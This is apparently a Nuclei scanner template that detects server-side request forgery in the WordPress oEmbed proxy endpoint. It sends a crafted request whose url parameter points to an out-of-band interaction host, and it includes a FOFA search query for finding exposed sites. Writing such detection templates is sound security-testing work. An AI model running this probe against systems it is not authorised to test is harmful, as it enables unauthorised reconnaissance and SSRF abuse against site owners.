id: wordpress-ssrf-oembed

info:
  name: Wordpress Oembed Proxy SSRF
  author: dhiyaneshDk
  severity: medium
  reference:
    - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
    - https://github.com/incogbyte/quickpress/blob/master/core/req.go
  tags: wordpress,ssrf,oast,proxy
  metadata:
    fofa-query: body="oembed" && body="wp-"
    max-request: 1

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-json/oembed/1.0/proxy"
      - "{{BaseURL}}/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}/"

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(to_lower(response_1), "rest_missing_callback_param")'

      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "http")'
